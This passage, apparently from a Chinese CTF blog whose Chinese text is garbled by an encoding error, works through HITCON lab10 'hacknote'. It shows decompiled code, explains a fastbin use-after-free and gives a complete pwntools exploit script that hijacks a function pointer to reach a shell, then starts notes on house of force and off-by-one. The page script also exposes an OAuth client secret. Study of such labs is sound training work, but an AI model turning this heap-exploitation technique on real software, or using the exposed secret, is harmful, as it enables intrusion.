LABEL_13<span class="token punctuation">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>
      <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//æ·»åŠ note</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>çœ‹çœ‹addå‡½æ•°ï¼š</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//add_note</span>
<span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  _DWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>
  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-1Ch]</span>
  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+10h] [ebp-18h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+14h] [ebp-14h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆä¸ºnotelistç”³è¯·8å¤§å°çš„ç©ºé—´</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> print_note_content<span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">=</span> notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        v0<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å†ä¸ºè¾“å…¥çš„å†…å®¹ï¼ˆcontentï¼‰ç”³è¯·ç©ºé—´</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alloca Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¯»å–å†…å®¹</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">++</span>count<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Full"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>deleteå‡½æ•°:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">del_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//å…ˆfreeæ‰content</span>
    <span class="token function">free</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//å†freeè‡ªå·±</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>print_note:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">print_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-10h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">>=</span> count <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Out of bound!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>notelist<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>è¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ª<code>magicï¼ˆaddr = 0x08048986)</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡å“¦ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102205533.png" alt=""></p>
<blockquote>
<p> è§£é¢˜é€»è¾‘ï¼šé€šè¿‡ä¸Šé¢å¯¹fastbinï¼Œuafçš„äº†è§£åï¼Œå¤§æ¦‚å¯ä»¥ç†è§£è¿™ä¸ªé¢˜ç›®çš„è§£é¢˜æ–¹æ³•äº†ã€‚æˆ‘ä»¬é¦–å…ˆè¦æ˜ç™½mallocå’Œfreeæœºåˆ¶ï¼Œå…ˆè¢«freeæ‰çš„å—ä¼šå¾ˆå¿«è¢«åº”ç”¨äºæ–°çš„mallocï¼Œå‰ææ˜¯å¤§å°åˆé€‚ï¼Œä¾‹å¦‚<code>free v1; v2 = malloc(4)</code>ï¼Œå¦‚æœåŸæ¥v1çš„å¤§å°ä¹Ÿä¸º4ï¼Œé‚£ä¹ˆv1åŸæ¥çš„é‚£å—å†…å­˜å°±ä¼šè¢«åˆ†é…ç»™v2ï¼Œé€šè¿‡v1å¯ä»¥ï¼ˆuafï¼‰è®¿é—®v2çš„å†…å®¹ã€‚</p>
<p>Fï¼ŒAï¼ŒUï¼ˆå…ˆFREE,å†ä¿®æ”¹chunkï¼Œè°ƒç”¨chunkä¸­çš„å‡½æ•°æŒ‡é’ˆï¼‰ã€‚è®©ä¸¤ä¸ªæŒ‡é’ˆå®é™…æŒ‡å‘åŒä¸€ä¸ªchunkï¼Œä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå­—ç¬¦ä¸²ï¼Œä»è€Œå†™å…¥ä»»æ„å€¼ï¼Œå¦ä¸€ä¸ªæŒ‡é’ˆæŠŠå†…å­˜è§£é‡Šä¸ºå‡½æ•°æŒ‡é’ˆï¼Œä»è€Œæ§åˆ¶äº†EIPã€‚</p>
</blockquote>
<h3 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h3><p>å€Ÿé‰´veritas501å¸ˆå‚…çš„EXPï¼Œç¨åŠ ä¿®æ”¹å’Œç†è§£ï¼š</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>
bin <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#æ·»åŠ </span>
<span class="token keyword">def</span> <span class="token function">add_note</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#åˆ é™¤â€”â€”free</span>
<span class="token keyword">def</span> <span class="token function">del_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#æ‰“å°</span>
<span class="token keyword">def</span> <span class="token function">print_note</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>
    cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#sizeéšæ„ï¼Œä¸ç­‰äº8å°±è¡Œ</span>
add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'aaa'</span><span class="token punctuation">)</span>
add_note<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">'bbb'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#contentçš„å¤§å°ä¸ç­‰äº8ï¼ˆè¿™æ˜¯ç¨‹åºä¸­note_chunkçš„å¤§å°,note_chunkå°±æ˜¯ç¬¬ä¸€æ¬¡mallocçš„é‚£ä¸ªï¼‰ï¼Œæ˜¯ä¸ºäº†ç­‰ä¼šåˆ†é…8 bytesçš„contentä¸ä¼šè¢«åˆ†é…åˆ°ä¹‹å‰çš„contentçš„binä¸Šï¼Œè€Œæ˜¯åˆ†é…åˆ°noteçš„binä¸Šã€‚</span>

<span class="token comment" spellcheck="true">#æŒ‰ç…§mallocå’Œfreeæœºåˆ¶ï¼Œå¦‚æœæˆ‘ä»¬del_noteæ¢ä¸€ä¸‹ä½ç½®ï¼Œå…ˆdel_note(1)ï¼Œnote2_chunkä¼šè¢«æ”¾åœ¨åŸæ¥çš„note0_chunkä½ç½®ï¼Œè€Œnote3_contenté‡Œçš„magicå‡½æ•°åœ°å€å°±ä¼šè¢«æ”¾åœ¨note1_chunkä½ç½®ï¼Œåé¢çš„print_note(0)ï¼ŒåŒæ ·ä¹Ÿéœ€è¦æ”¹ä¸ºprint_note(1)ï¼Œæ‰èƒ½getshell</span>
del_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
del_note<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

add_note<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span>bin<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'magic'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

print_note<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>è¿è¡Œæ•ˆæœï¼š</p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102214243.png" alt=""></p>
<h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11-bamboobox"></a>lab11-bamboobox</h2><h3 id="hof-house-of-force"><a href="#hof-house-of-force" class="headerlink" title="hof (house of force)"></a>hof (house of force)</h3><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/house_of_force.html" target="_blank" rel="noopener">heap-exploitationâ€”â€”house of forceå‚è€ƒé“¾æ¥</a></p>
<blockquote>
<p>å¼•ç”¨m4xå¤§ä½¬åšå®¢åŸè¯ï¼š</p>
<p>ç®€å•è¯´ä¸€ä¸‹æˆ‘å¯¹ hof çš„ç†è§£ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ <strong>top_chunk</strong> çš„ <strong>size</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ§åˆ¶ malloc ä¸€äº›ç²¾å¿ƒè®¾è®¡çš„<strong>å¤§æ•°/è´Ÿæ•°</strong>æ¥å®ç°æ§åˆ¶ top_chunk çš„æŒ‡é’ˆï¼Œå°±å¯ä»¥å®ç°ä»»æ„åœ°å€å†™çš„æ•ˆæœï¼Œä¸ªäººæ„Ÿè§‰ï¼Œhof çš„æ ¸å¿ƒæ€æƒ³å°±åœ¨è¿™ä¸ª force ä¸Šï¼Œç–¯ç‹‚ mallocï¼Œç®€å•ç²—æš´æ•ˆæœæ˜æ˜¾ã€‚</p>
</blockquote>
<h3 id="off-by-oneæ¼æ´"><a href="#off-by-oneæ¼æ´" class="headerlink" title="off_by_oneæ¼æ´"></a>off_by_oneæ¼æ´</h3><blockquote>
<p><a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">å‚è€ƒé“¾æ¥</a></p>
<p>ä¸€ä¸ªå­—èŠ‚æº¢å‡ºè¢«ç§°ä¸ºoff-by-oneï¼Œæ›¾ç»çš„ä¸€æ®µæ—¶é—´é‡Œï¼Œoff-by-oneè¢«è®¤ä¸ºæ˜¯ä¸å¯ä»¥åˆ©ç”¨çš„ï¼Œä½†æ˜¯åæ¥ç ”ç©¶å‘ç°åœ¨å †ä¸Šå“ªæ€•åªæœ‰ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºä¹Ÿä¼šå¯¼è‡´ä»»æ„ä»£ç çš„æ‰§è¡Œã€‚</p>
</blockquote>
<blockquote>
<p>==&gt; off-by-oneæ€»å…±å¯ä»¥åˆ†ä¸ºä¸¤ç§åˆ©ç”¨æ–¹å¼:</p>
<p><strong>chunk overlapping</strong></p>
<ul>
<li><p>off-by-one overwrite allocated</p>
</li>
<li><p>off-by-one overwrite freed</p>
</li>
<li><p>off-by-one null byte</p>
</li>
</ul>
<p><strong>unlink</strong></p>
<ul>
<li><p>off-by-one small bin</p>
</li>
<li><p>off-by-one large bin</p>
</li>
</ul>
</blockquote>
<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><a href="https://github.com/bash-c/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf" target="_blank" rel="noopener">unlinkâ€”â€”pdf</a></p>
<h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½-1"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½-1" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote>
<p>checksec it!</p>
<p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181102221726.png" alt=""></p>
<p>å¼€å¯äº†NX,Stackï¼ŒåŒæ ·æ— æ³•é€šè¿‡å¸¸è§„æ–¹å¼æ¥æ”»å‡»ã€‚</p>
</blockquote>
<p>å¾…æ›´æ–°ã€‚ã€‚ã€‚</p>

            </div>
            <hr/>

            
            <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.88rem;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff;
        background-color: #22AB38;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff;
        background-color: #019FE8;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a class="reward-link btn-floating btn-large waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close"><i class="fa fa-close"></i></a>
            <h4 class="reward-title">ä½ çš„èµè¯†æ˜¯æˆ‘å‰è¿›çš„åŠ¨åŠ›</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs">
                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">å¾®ä¿¡</a></li>
                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li>
                    </ul>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.png" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('#reward .reward-link').on('click', function () {
            $('#rewardModal').openModal();
        });

        $('#rewardModal .close').on('click', function () {
            $('#rewardModal').closeModal();
        });
    });
</script>
            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>å¾®ä¿¡é‡Œç‚¹â€œå‘ç°â€->â€œæ‰«ä¸€æ‰«â€äºŒç»´ç ä¾¿å¯æŸ¥çœ‹åˆ†äº«ã€‚</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            <div class="reprint">
                <p>
                    <span class="reprint-tip">è½¬è½½è¯·æ³¨æ˜: </span>
                    <a href="http://www.yof3ng.xyz" class="b-link-green">Yof3ng's Blog | çƒ­çˆ±åˆ†äº«</a>
                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                    <a href="/2018/11/02/Pwn-11æœˆ02-Hitcon-å…­/" class="b-link-green">Pwn-11æœˆ02-Hitcon-å…­</a>
                </p>
            </div>
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '2a5e8e145ae3a20a52e2',
        clientSecret: 'e645b80a4a8ea094b8a09076f6c1a7d186a0903a',
        repo: 'yof3ng.github.io',
        owner: 'Yof3ng',
        admin: "Yof3ng",
        id: '2018-11-02T14-31-11',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
            <div class="article-badge left-badge text-color">æœ¬ç¯‡</div>
            <div class="card">
                <a href="/2018/11/02/Pwn-11æœˆ02-Hitcon-å…­/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Pwn-11æœˆ02-Hitcon-å…­">
                        
                        <span class="card-title">Pwn-11æœˆ02-Hitcon-å…­</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">[TOC]
Pwn-11æœˆ02-Hitcon-å…­
è¿›åº¦è¿˜æ˜¯å¤ªæ…¢äº†ï¼Œä¸èƒ½å†å¢¨è¿¹ä¸‹å»äº†ğŸ’ªï¼ï¼

lab10-hacknote
&nbsp; &nbsp; &nbsp; &nbsp; è¿™æ˜¯ä¸€é“ fastbin uafåˆ©ç”¨ï¼Ÿfastbinæ˜¯ä»€ä¹ˆï¼Ÿ</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-02
                            </span>
